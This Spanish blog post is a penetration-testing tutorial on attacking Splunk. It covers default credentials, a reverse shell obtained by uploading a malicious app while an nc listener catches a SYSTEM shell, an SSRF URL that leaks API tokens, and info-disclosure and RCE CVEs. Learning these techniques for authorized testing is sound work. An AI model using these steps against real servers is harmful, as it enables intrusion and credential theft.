---
date: 2025-11-09T21:15:05.000Z
layout: post
comments: true
title: "Hacking Splunk"
subtitle: 'Tipos de ataque'
description: >-
image: >-
  /images/splunklogo.png
optimized_image: >-
  /images/splunklogo.png
category: ciberseguridad
tags:
  - web
  - rce
  - owasp
  - siem
author: Felipe Canales Cayuqueo
paginate: true
---

Splunk es una plataforma de software diseñada para recopilar, indexar y analizar grandes volúmenes de datos generados por máquinas en tiempo real. Permite monitorear, buscar y visualizar registros (logs) provenientes de aplicaciones, servidores, redes o dispositivos, facilitando la detección de errores, anomalías de seguridad y el análisis del rendimiento del sistema. Su capacidad para transformar datos sin procesar en paneles e informes interactivos la convierte en una herramienta clave en áreas como la observabilidad, la ciberseguridad y la inteligencia operativa.

El mayor enfoque de Splunk durante una evaluación sería una credencial débil como admin, Welcome, Welcome1, Password123, entre otras o que no requiera autenticación (como es el caso de las versiones gratuitas). El servidor web Splunk se ejecuta de forma predeterminada en el puerto 8000. En ciertas versiones de Splunk, las credenciales por defecto son ```admin:changeme```.

Splunk puede instalarse en hosts Windows o Linux y permite ejecutar entradas basadas en scripts (Bash, PowerShell, Batch) y, dado que incluye Python, también ejecutar scripts en ese lenguaje. Esta flexibilidad facilita integraciones útiles, pero implica un riesgo importante: si las entradas de datos o los scripts no están correctamente controlados, podrían usarse para ejecutar código arbitrario en el servidor de Splunk.

### Reverse Shell (RCE)

Para esto debemos clonarnos el siguiente repositorio de GitHub: [reverse_shell_splunk](https://github.com/0xjpuff/reverse_shell_splunk/). Luego nos iremos a la carpeta ```bin``` para editar el archivo ```run``` que corresponda al sistema operativo atacado. Como en este caso es windows entonces será el ```run.ps1```.

> Si fuera Linux se tendría que configurar rev.py.

[![splunk1](/images/splunk1.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/splunk1.png)


Una vez editado el archivo procedemos a crear un archivo tar para posteriormente instalarlo.

```
┌──(root㉿nptg)-[/splunk]
└─# tar -cvzf updater.tar.gz reverse_shell_splunk
reverse_shell_splunk/
reverse_shell_splunk/default/
reverse_shell_splunk/default/inputs.conf
reverse_shell_splunk/bin/
reverse_shell_splunk/bin/run.ps1
reverse_shell_splunk/bin/rev.py
reverse_shell_splunk/bin/run.bat
```

Como ya tenemos el archivo tar nos vamos a explorar en splunk, luego a Splunk Apps.

[![splunk2](/images/splunk2.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/splunk2.png)

Una vez ahí podemos irnos a la parte superior para seleccionar "Manage Apps".

[![splunk3](/images/splunk3.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/splunk3.png)

Ahora podremos instalar la aplicación maliciosa.

[![splunk4](/images/splunk4.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/splunk4.png)

[![splunk5](/images/splunk5.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/splunk5.png)

[![splunk6](/images/splunk6.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/splunk6.png)

Como tenemos seleccionado el archivo, antes de subirlo debemos ponernos a la escucha en el puerto que configuramos anteriormente.

```
┌──(root㉿nptg)-[/splunk]
└─# nc -nlvp 4646
listening on [any] 4646 ...
```

Finalmente hacemos seleccionamos la opción "Upload" e inmediatamente recibimos la shell inversa en nuestro netcat.

[![splunk7](/images/splunk7.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/splunk7.png)

```
┌──(root㉿nptg)-[/splunk]
└─# nc -nlvp 4646                          
listening on [any] 4646 ...
connect to [10.10.14.162] from (UNKNOWN) [10.129.201.50] 51089

PS C:\Windows\system32> whoami
nt authority\system
```

### Server-Side Request Forgery (SSRF)

Para las versiones 6.4.3 de Splunk Enterprise la aplicación toma el valor del parámetro alerts_id recibido por GET y lo utiliza para construir una petición HTTP hacia el servicio splunkd que escucha en el puerto 8089, sin validar ese valor. Como no hay comprobaciones sobre el destino, un atacante puede forzar a la aplicación a realizar solicitudes HTTP hacia cualquier host que él controle.

El problema se agrava porque las peticiones internas que Splunk realiza incluyen en el encabezado Authorization el token de la API REST del usuario actualmente autenticado. Si un atacante consigue que la aplicación envíe la petición hacia un dominio externo bajo su control, ese token puede ser “filtrado” (exfiltrado) fuera de la red. Con ese token robado, el atacante puede llamar a la API REST de Splunk con los mismos privilegios del usuario cuya credencial se capturó.

```
/en-US/alerts/launcher?eai%3Aacl.app=launcher&eai%3Aacl.owner=*&severity=*&alerts_id=[DOMAIN]&search=test
```

> [Splunk Enterprise 6.4.3 - Server-Side Request Forgery](https://www.exploit-db.com/exploits/40895)


### CVE-2018-11409

Splunk hasta la versión 7.0.1 permite la divulgación de información agregando __raw/services/server/info/server-info?output_mode=json a una consulta, como se demuestra al descubrir una clave de licencia.

```
https://127.0.0.1:8000/en-US/splunkd/__raw/services/server/info/server-info?output_mode=json
```

### CVE-2011-4642

Splunk Web (Splunk 4.2.x, versiones anteriores a la 4.2.5) contiene una falla en ```mappy.py``` que no restringe correctamente el uso del comando ```mappy``` para acceder a clases de Python. Como resultado, un administrador remoto autenticado puede ejecutar código arbitrario aprovechando el módulo ```sys``` en una petición dirigida a la aplicación ```Search```, la técnica puede llevarse a cabo mediante un ataque de tipo CSRF.

Cuenta con un módulo en metasploit llamado ```Splunk Search Remote Code Execution``` o bien un script en Python en [exploitdb](https://www.exploit-db.com/exploits/18245) que lo combina con otras tres vulnerabilidades.
